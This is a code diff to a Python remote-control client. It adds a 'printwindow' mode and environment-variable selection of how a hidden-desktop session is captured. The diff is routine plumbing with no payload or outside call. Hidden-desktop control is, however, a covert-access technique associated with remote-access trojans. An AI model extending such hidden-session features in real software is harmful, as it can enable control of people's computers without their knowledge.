@@ -16,7 +16,11 @@ from remote_client.media.screen import ScreenTrack
 from remote_client.security.e2ee import load_e2ee_context
 from remote_client.webrtc.client import SessionResources, WebRTCClient
 from remote_client.webrtc.signaling import create_signaling, create_signaling_from_url
-from remote_client.windows.hidden_desktop import HiddenDesktopSession
+from remote_client.windows.hidden_desktop import (
+    HiddenDesktopSession,
+    HiddenWindowSession,
+    create_hidden_session,
+)
 
 logger = logging.getLogger(__name__)
 
@@ -62,6 +66,8 @@ def _normalize_mode(mode: str | None) -> str:
         return "view"
     if value in {"hidden", "hidden-manage", "hidden_manage", "hidden-desktop", "hidden_desktop"}:
         return "hidden"
+    if value in {"printwindow", "print_window", "print-window", "pw"}:
+        return "printwindow"
     return "manage"
 
 
@@ -130,9 +136,25 @@ def build_session_resources(mode: str | None) -> SessionResources:
             set_stream_profile=_set_stream_profile,
             set_cursor_visibility=cursor_controller.set_visible,
         )
-    if normalized == "hidden":
+    if normalized in {"hidden", "printwindow"}:
+        # Determine which mode to use
+        if normalized == "printwindow":
+            session_mode = "printwindow"
+        else:
+            # Check environment variable for preferred hidden mode
+            env_mode = os.getenv("RC_HIDDEN_MODE", "auto").strip().lower()
+            if env_mode in {"printwindow", "pw"}:
+                session_mode = "printwindow"
+            elif env_mode in {"virtual_display", "vd", "driver"}:
+                session_mode = "virtual_display"
+            elif env_mode in {"fallback", "legacy"}:
+                session_mode = "fallback"
+            else:
+                session_mode = "auto"
+        
         try:
-            hidden_session = HiddenDesktopSession()
+            hidden_session = create_hidden_session(mode=session_mode)
+            logger.info("Hidden session started in %s mode", hidden_session.mode)
         except Exception as exc:
             logger.warning("Hidden desktop session unavailable: %s", exc)
         else:
